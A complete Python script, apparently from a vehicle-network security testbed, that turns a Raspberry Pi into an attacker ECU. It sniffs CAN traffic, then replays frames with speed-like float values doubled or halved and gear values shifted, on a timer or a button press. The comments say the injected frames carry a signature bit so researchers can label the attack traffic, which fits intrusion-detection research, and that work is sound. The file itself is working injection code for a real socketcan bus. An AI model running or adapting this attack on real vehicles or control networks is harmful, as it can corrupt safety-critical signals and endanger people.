#!/usr/bin/env python3
"""
attacker_ECU_real_can.py

Runs three replay attacks with modified data within a 30-minute period.
Each attack lasts 15 seconds and occurs at random times within 10-minute intervals.
Button press triggers immediate attack for demonstrability.
White LED indicates sniffing, Red LED indicates active attack.
Designed for Raspberry Pi deployment with real CAN network.

Each attack sniffs legitimate messages, then replays them with modified data.
All malicious messages are marked with a signature bit in the last byte.
"""
import os
import can
import time
import argparse
import random
from datetime import datetime
import struct
import subprocess
import threading

# Try to import RPi.GPIO, but don't fail if not on Pi
try:
    import RPi.GPIO as GPIO
    GPIO_AVAILABLE = True
except ImportError:
    GPIO_AVAILABLE = False
    print("GPIO not available - running in test mode")

# Log file for attack times
ATTACK_LOG_FILE = "attack_times.log"

# Signature bit mask (using MSB of last byte for marking malicious messages)
SIGNATURE_BIT_MASK = 0x80  # 10000000 in binary - high bit of last byte

# GPIO Pin Configuration
BUTTON_PIN = 17      # GPIO pin for button (BCM numbering)
WHITE_LED_PIN = 27   # GPIO pin for white LED (sniffing indicator)
RED_LED_PIN = 22     # GPIO pin for red LED (attack indicator)

# Customizable time intervals (in seconds)
TOTAL_RUNTIME = 1800          # 30 minutes total
INTERVAL_DURATION = 600       # 10 minutes per interval
NUM_ATTACKS = 3               # Number of attacks to perform
ATTACK_DURATION = 15          # Duration of each attack in seconds
SNIFF_DURATION = 15          # Duration of sniffing phase in seconds

# Global variables for button handling
button_pressed = False
attack_in_progress = False
button_lock = threading.Lock()

def setup_can_interface(interface='can0', bitrate=1000000):
    """
    Set up the CAN interface on Raspberry Pi.
    This ensures the interface is properly configured before use.
    """
    print(f"Setting up {interface} with bitrate {bitrate}...")
    
    commands = [
        f"sudo ip link set {interface} down",
        f"sudo ip link set {interface} type can bitrate {bitrate}",
        f"sudo ip link set {interface} txqueuelen 10000",
        f"sudo ip link set {interface} up"
    ]
    
    for cmd in commands:
        try:
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            if result.returncode != 0:
                print(f"Warning executing '{cmd}': {result.stderr}")
            else:
                print(f"✓ {cmd}")
        except Exception as e:
            print(f"Error executing '{cmd}': {e}")
            return False
    
    # Verify interface is up
    try:
        result = subprocess.run(['ip', 'link', 'show', interface], 
                              capture_output=True, text=True)
        if 'UP' in result.stdout:
            print(f"✓ {interface} is UP and running")
            return True
        else:
            print(f"✗ {interface} is not UP")
            return False
    except Exception as e:
        print(f"Error checking interface status: {e}")
        return False

def button_callback(channel):
    """
    Callback function for button press interrupt.
    Sets flag to trigger immediate attack.
    """
    global button_pressed
    with button_lock:
        if not attack_in_progress:
            button_pressed = True
            print("\n[BUTTON] Manual attack triggered!")

def setup_gpio():
    """
    Setup GPIO for button and LED control.
    Button uses interrupt for immediate response.
    """
    if GPIO_AVAILABLE:
        GPIO.setmode(GPIO.BCM)
        
        # Setup button with pull-up resistor and interrupt
        GPIO.setup(BUTTON_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        GPIO.add_event_detect(BUTTON_PIN, GPIO.FALLING, 
                             callback=button_callback, 
                             bouncetime=300)
        
        # Setup LED outputs
        GPIO.setup(WHITE_LED_PIN, GPIO.OUT)
        GPIO.setup(RED_LED_PIN, GPIO.OUT)
        
        # Ensure LEDs are off initially
        GPIO.output(WHITE_LED_PIN, GPIO.LOW)
        GPIO.output(RED_LED_PIN, GPIO.LOW)
        
        print("\n[GPIO] Initialized successfully")
        print("  - Button on GPIO17 (press anytime for immediate attack)")
        print("  - White LED on GPIO27 (sniffing indicator)")
        print("  - Red LED on GPIO22 (attack indicator)")

def set_led_state(white=False, red=False):
    """
    Control LED states. Only one LED should be on at a time.
    
    Args:
        white: Turn on white LED if True
        red: Turn on red LED if True
    """
    if GPIO_AVAILABLE:
        # Ensure only one LED is on at a time
        if red:
            GPIO.output(WHITE_LED_PIN, GPIO.LOW)
            GPIO.output(RED_LED_PIN, GPIO.HIGH)
        elif white:
            GPIO.output(WHITE_LED_PIN, GPIO.HIGH)
            GPIO.output(RED_LED_PIN, GPIO.LOW)
        else:
            GPIO.output(WHITE_LED_PIN, GPIO.LOW)
            GPIO.output(RED_LED_PIN, GPIO.LOW)

def mark_as_malicious(data):
    """
    Add signature bit to the last byte of data to mark it as a malicious message.
    This helps researchers identify attack traffic in logs.
    """
    if not data:
        return bytes([SIGNATURE_BIT_MASK])
    
    # Convert to list for manipulation
    data_list = list(data)
    
    # Set the signature bit in the last byte
    data_list[-1] |= SIGNATURE_BIT_MASK
    
    return bytes(data_list)

def modify_data(data, arbitration_id, modification_type='increase'):
    """
    Modify the data values to create malicious content.
    Takes into account the data type based on arbitration ID.
    
    Args:
        data: Original message data
        arbitration_id: CAN message ID to determine data type
        modification_type: 'increase' (200%) or 'decrease' (50%)
    """
    if not data or len(data) < 4:
        return data
    
    # Decode based on arbitration ID (matching CARLA client encoding)
    try:
        if arbitration_id in [0x123, 0x124, 0x125, 0x126, 0x127]:  # Float values
            # Unpack as float
            original_value = struct.unpack('>f', data[:4])[0]
            
            # Modify value
            if modification_type == 'increase':
                modified_value = original_value * 2.0  # 200%
            else:
                modified_value = original_value * 0.5  # 50%
            
            # Pack back to bytes
            modified_data = struct.pack('>f', modified_value)
            # Preserve any additional bytes
            if len(data) > 4:
                modified_data += data[4:]
            
            return modified_data
            
        elif arbitration_id == 0x128:  # Integer value (gear)
            # Unpack as int
            original_value = struct.unpack('>i', data[:4])[0]
            
            # For gear, just toggle between valid values
            if modification_type == 'increase':
                modified_value = min(6, original_value + 1)  # Max gear
            else:
                modified_value = max(-1, original_value - 1)  # Min gear (reverse)
            
            # Pack back to bytes
            modified_data = struct.pack('>i', modified_value)
            # Preserve any additional bytes
            if len(data) > 4:
                modified_data += data[4:]
            
            return modified_data
            
        else:
            # Unknown ID, do simple byte manipulation
            data_list = list(data)
            for i in range(len(data_list)):
                if modification_type == 'increase':
                    data_list[i] = min(255, int(data_list[i] * 2.0))
                else:
                    data_list[i] = max(0, int(data_list[i] * 0.5))
            return bytes(data_list)
            
    except Exception as e:
        print(f"Error modifying data for ID {hex(arbitration_id)}: {e}")
        # Fallback to simple modification
        return data

def log_attack(attack_type, start_time, end_time, trigger_type="scheduled"):
    """Log attack start and end times to a file for later analysis."""
    start_str = datetime.fromtimestamp(start_time).strftime("%Y-%m-%d %H:%M:%S.%f")
    end_str = datetime.fromtimestamp(end_time).strftime("%Y-%m-%d %H:%M:%S.%f")
    
    with open(ATTACK_LOG_FILE, "a") as log:
        log.write(f"{attack_type},{start_str},{end_str},{trigger_type}\n")
    print(f"Attack logged: {attack_type} ({trigger_type}) from {start_str} to {end_str}")

def sniff_and_replay_attack(bus, attack_duration=15, sniff_duration=15, trigger_type="scheduled"):
    """
    Sniff CAN messages and replay them with modified data.
    White LED on during sniffing, red LED on during attack.
    
    Args:
        bus: CAN bus interface
        attack_duration: Duration of the attack in seconds (default 15)
        sniff_duration: Duration of sniffing phase in seconds (default 15)
        trigger_type: "scheduled" or "manual" to indicate how attack was triggered
    """
    global attack_in_progress
    attack_in_progress = True
    
    print("\n" + "="*50)
    print(f"=== Starting Sniff and Replay Attack ({trigger_type}) ===")
    print("="*50)
    attack_start = time.time()
    
    # Turn on white LED for sniffing phase
    set_led_state(white=True, red=False)
    
    # First, sniff for specified duration to collect messages
    print(f"\n[SNIFF PHASE] Collecting legitimate messages for {sniff_duration} seconds...")
    print("[LED] White LED ON - Sniffing in progress")
    recorded_messages = []
    observed_ids = set()
    message_counts = {}
    
    sniff_end = time.time() + sniff_duration
    while time.time() < sniff_end:
        msg = bus.recv(timeout=0.1)
        if msg:
            # Don't record messages that are already marked as malicious
            if msg.data and not (msg.data[-1] & SIGNATURE_BIT_MASK):
                recorded_messages.append(msg)
                observed_ids.add(msg.arbitration_id)
                message_counts[msg.arbitration_id] = message_counts.get(msg.arbitration_id, 0) + 1
    
    print(f"\n[SNIFF RESULTS]")
    print(f"  Total messages: {len(recorded_messages)}")
    print(f"  Unique IDs: {len(observed_ids)}")
    print(f"  Message distribution:")
    for can_id, count in sorted(message_counts.items()):
        print(f"    ID {hex(can_id)}: {count} messages")
    
    if not recorded_messages:
        print("\n[ERROR] No legitimate messages sniffed, ending attack")
        set_led_state(white=False, red=False)
        attack_in_progress = False
        return attack_start, time.time()
    
    # Switch to red LED for attack phase
    set_led_state(white=False, red=True)
    
    # Now replay with modifications for the attack duration
    print(f"\n[REPLAY PHASE] Injecting modified messages for {attack_duration} seconds...")
    print("[LED] Red LED ON - Attack in progress")
    print("  Alternating between 200% increase and 50% decrease modifications")
    
    replay_start = time.time()
    replay_end = replay_start + attack_duration
    messages_sent = 0
    attack_types = {}
    
    # Replay messages in a loop
    msg_index = 0
    while time.time() < replay_end:
        # Get next message to replay (loop through recorded messages)
        original_msg = recorded_messages[msg_index % len(recorded_messages)]
        msg_index += 1
        
        # Alternate between increase and decrease
        if messages_sent % 2 == 0:
            modification_type = 'increase'
        else:
            modification_type = 'decrease'
        
        # Modify the data based on message type
        modified_data = modify_data(original_msg.data, 
                                  original_msg.arbitration_id, 
                                  modification_type)
        
        # Mark as malicious
        malicious_data = mark_as_malicious(modified_data)
        
        # Create modified message
        modified_msg = can.Message(
            arbitration_id=original_msg.arbitration_id,
            data=malicious_data,
            is_extended_id=original_msg.is_extended_id
        )
        
        try:
            bus.send(modified_msg)
            messages_sent += 1
            
            # Track attack types
            key = (original_msg.arbitration_id, modification_type)
            attack_types[key] = attack_types.get(key, 0) + 1
            
            # Log sample messages (every 10th to avoid spam)
            if messages_sent % 10 == 0:
                # Try to decode the values for better logging
                try:
                    if original_msg.arbitration_id in [0x123, 0x124, 0x125, 0x126, 0x127]:
                        orig_val = struct.unpack('>f', original_msg.data[:4])[0]
                        mod_val = struct.unpack('>f', modified_data[:4])[0]
                        print(f"  [{messages_sent}] ID={hex(original_msg.arbitration_id)}, "
                              f"Original={orig_val:.2f}, Modified={mod_val:.2f} ({modification_type})")
                    else:
                        print(f"  [{messages_sent}] ID={hex(original_msg.arbitration_id)}, "
                              f"Type={modification_type}")
                except:
                    pass
                    
        except can.CanError as e:
            print(f"[ERROR] Failed to send message: {e}")
        
        # Small delay to match legitimate traffic rate
        time.sleep(0.01)
    
    # Turn off LEDs after attack
    set_led_state(white=False, red=False)
    print("[LED] All LEDs OFF - Attack complete")
    
    attack_end = time.time()
    attack_in_progress = False
    
    # Print attack summary
    print(f"\n[ATTACK SUMMARY]")
    print(f"  Duration: {attack_end - replay_start:.2f} seconds")
    print(f"  Messages sent: {messages_sent}")
    print(f"  Attack distribution:")
    for (can_id, mod_type), count in sorted(attack_types.items()):
        print(f"    ID {hex(can_id)} ({mod_type}): {count} messages")
    
    return attack_start, attack_end

def run_attack_sequence(bus, total_runtime=1800, attack_duration=15, interval_duration=600, num_attacks=3):
    """
    Run multiple attacks at random times within specified intervals.
    Also monitors button for manual attack triggers.
    
    Args:
        bus: CAN bus interface
        total_runtime: Total monitoring period in seconds (default 1800 = 30 minutes)
        attack_duration: Duration of each attack in seconds (default 15)
        interval_duration: Duration of each interval in seconds (default 600 = 10 minutes)
        num_attacks: Number of attacks to perform (default 3)
    """
    global button_pressed
    
    print("\n" + "="*60)
    print("=== CAN BUS ATTACK SEQUENCE STARTED ===")
    print("="*60)
    print(f"\nConfiguration:")
    print(f"  Total runtime: {total_runtime} seconds ({total_runtime/60:.1f} minutes)")
    print(f"  Number of scheduled attacks: {num_attacks}")
    print(f"  Interval duration: {interval_duration} seconds ({interval_duration/60:.1f} minutes)")
    print(f"  Attack duration: {attack_duration} seconds per attack")
    print(f"  Attack timing: Random within each interval")
    print(f"  Manual override: Press button anytime for immediate attack")
    print(f"  Malicious marker: Signature bit {bin(SIGNATURE_BIT_MASK)}")
    
    # Initialize log file
    with open(ATTACK_LOG_FILE, "w") as log:
        log.write("attack_type,start_time,end_time,trigger_type\n")
    
    sequence_start = time.time()
    
    # Calculate scheduled attack times - one random time within each interval
    scheduled_attacks = []
    for i in range(num_attacks):
        interval_start = i * interval_duration
        interval_end = min((i + 1) * interval_duration, total_runtime)
        
        # Ensure attack can complete within the interval
        latest_attack_start = interval_end - attack_duration - 20  # Account for sniffing time
        if latest_attack_start > interval_start:
            attack_delay = random.uniform(interval_start + 30, latest_attack_start)  # Start after 30s minimum
            scheduled_attacks.append(attack_delay)
    
    print(f"\n[SCHEDULE] Scheduled attacks will occur at:")
    for i, attack_time in enumerate(scheduled_attacks):
        interval_num = i + 1
        time_in_interval = attack_time - (i * interval_duration)
        print(f"  Attack {i+1}: {attack_time:.1f}s from start "
              f"({time_in_interval:.1f}s into interval {interval_num})")
    
    # Track attacks
    scheduled_index = 0
    manual_attack_count = 0
    normal_msg_count = 0
    last_attack_time = 0
    
    print(f"\n[MONITOR] Recording normal CAN traffic...")
    print("[LED] All LEDs OFF - Normal monitoring mode")
    print("[BUTTON] Press button anytime for immediate attack")
    
    while time.time() - sequence_start < total_runtime:
        current_time = time.time() - sequence_start
        
        # Check for manual button press
        if button_pressed:
            with button_lock:
                button_pressed = False
            
            # Ensure minimum time between attacks
            if time.time() - last_attack_time > 35:  # Min 35s between attacks (15s sniff + 15s attack + 5s buffer)
                manual_attack_count += 1
                print(f"\n[MANUAL ATTACK {manual_attack_count}] Button triggered attack...")
                
                # Execute the manual attack
                start, end = sniff_and_replay_attack(bus, attack_duration, trigger_type="manual")
                log_attack("sniff_replay", start, end, "manual")
                last_attack_time = time.time()
                
                print(f"\n[MONITOR] Resuming normal traffic monitoring...")
                print("[BUTTON] Press button anytime for immediate attack")
                normal_msg_count = 0
            else:
                wait_time = 35 - (time.time() - last_attack_time)
                print(f"[BUTTON] Attack in cooldown, wait {wait_time:.1f}s")
        
        # Check if it's time for a scheduled attack
        elif scheduled_index < len(scheduled_attacks) and current_time >= scheduled_attacks[scheduled_index]:
            print(f"\n[SCHEDULED ATTACK {scheduled_index + 1}] Initiating scheduled attack...")
            
            # Execute the scheduled attack
            start, end = sniff_and_replay_attack(bus, attack_duration, trigger_type="scheduled")
            log_attack("sniff_replay", start, end, "scheduled")
            last_attack_time = time.time()
            
            scheduled_index += 1
            
            # Resume monitoring
            if scheduled_index < len(scheduled_attacks):
                next_attack_time = scheduled_attacks[scheduled_index] - current_time
                print(f"\n[MONITOR] Resuming normal traffic monitoring...")
                print(f"[MONITOR] Next scheduled attack in {next_attack_time:.1f} seconds")
            else:
                print(f"\n[MONITOR] All scheduled attacks complete, monitoring continues...")
            
            print("[BUTTON] Press button anytime for immediate attack")
            normal_msg_count = 0
        
        # Monitor normal traffic
        msg = bus.recv(timeout=0.1)
        if msg:
            normal_msg_count += 1
            if normal_msg_count % 100 == 0:
                remaining_total = total_runtime - (time.time() - sequence_start)
                status = f"[MONITOR] {normal_msg_count} messages, {remaining_total:.1f}s remaining"
                
                if scheduled_index < len(scheduled_attacks):
                    next_scheduled = scheduled_attacks[scheduled_index] - current_time
                    status += f", next scheduled in {next_scheduled:.1f}s"
                
                print(status)
    
    sequence_duration = time.time() - sequence_start
    print(f"\n" + "="*60)
    print("=== ATTACK SEQUENCE COMPLETED ===")
    print("="*60)
    print(f"\nFinal Statistics:")
    print(f"  Total duration: {sequence_duration:.2f} seconds ({sequence_duration/60:.2f} minutes)")
    print(f"  Scheduled attacks completed: {scheduled_index}")
    print(f"  Manual attacks triggered: {manual_attack_count}")
    print(f"  Total attacks: {scheduled_index + manual_attack_count}")
    print(f"  Log file: {ATTACK_LOG_FILE}")

def main():
    parser = argparse.ArgumentParser(
        description="CAN Bus Attack Script with Automatic Scheduling and Manual Button Override"
    )
    parser.add_argument("--duration", type=int, default=ATTACK_DURATION,
                        help=f"Duration of each attack in seconds (default: {ATTACK_DURATION})")
    parser.add_argument("--sniff-time", type=int, default=SNIFF_DURATION,
                        help=f"Duration of sniffing phase in seconds (default: {SNIFF_DURATION})")
    parser.add_argument("--total-time", type=int, default=TOTAL_RUNTIME,
                        help=f"Total runtime in seconds (default: {TOTAL_RUNTIME} = {TOTAL_RUNTIME/60} minutes)")
    parser.add_argument("--interval", type=int, default=INTERVAL_DURATION,
                        help=f"Duration of each interval in seconds (default: {INTERVAL_DURATION} = {INTERVAL_DURATION/60} minutes)")
    parser.add_argument("--num-attacks", type=int, default=NUM_ATTACKS,
                        help=f"Number of scheduled attacks (default: {NUM_ATTACKS})")
    parser.add_argument("--channel", type=str, default="can0",
                        help="CAN interface (default: can0)")
    parser.add_argument("--bitrate", type=int, default=1000000,
                        help="CAN bitrate (default: 1000000)")
    parser.add_argument("--setup-can", action="store_true",
                        help="Set up CAN interface before starting")
    
    args = parser.parse_args()
    
    print(f"CAN Bus Attacker ECU - Real Network Mode")
    print(f"Target: {args.channel} @ {args.bitrate} bps")
    print(f"Automatic attacks scheduled + Manual button override enabled")
    print(f"LED Indicators: White=Sniffing, Red=Attacking")
    
    # Setup CAN interface if requested
    if args.setup_can:
        if not setup_can_interface(args.channel, args.bitrate):
            print("Failed to set up CAN interface. Try running with sudo.")
            return
    
    # Setup GPIO for button and LEDs
    if GPIO_AVAILABLE:
        try:
            setup_gpio()
            print("\n[GPIO] Ready for operation")
        except:
            print("[GPIO] Initialization failed - check wiring")
    else:
        print("\n[WARNING] GPIO not available - running without button/LED support")
    
    try:
        # Connect to CAN bus
        bus = can.Bus(channel=args.channel, interface='socketcan')
        print(f"\n✓ Connected to CAN bus: {args.channel}")
        
        # Run the attack sequence
        run_attack_sequence(bus, 
                          total_runtime=args.total_time,
                          attack_duration=args.duration,
                          interval_duration=args.interval,
                          num_attacks=args.num_attacks)
        
    except Exception as e:
        print(f"\n[ERROR] {e}")
        # Ensure LEDs are off on error
        set_led_state(white=False, red=False)
    finally:
        try:
            bus.shutdown()
            print("\n✓ CAN bus shutdown complete")
        except:
            pass
        
        if GPIO_AVAILABLE:
            try:
                # Ensure LEDs are off
                set_led_state(white=False, red=False)
                GPIO.cleanup()
                print("✓ GPIO cleanup complete")
            except:
                pass

if __name__ == "__main__":
    main()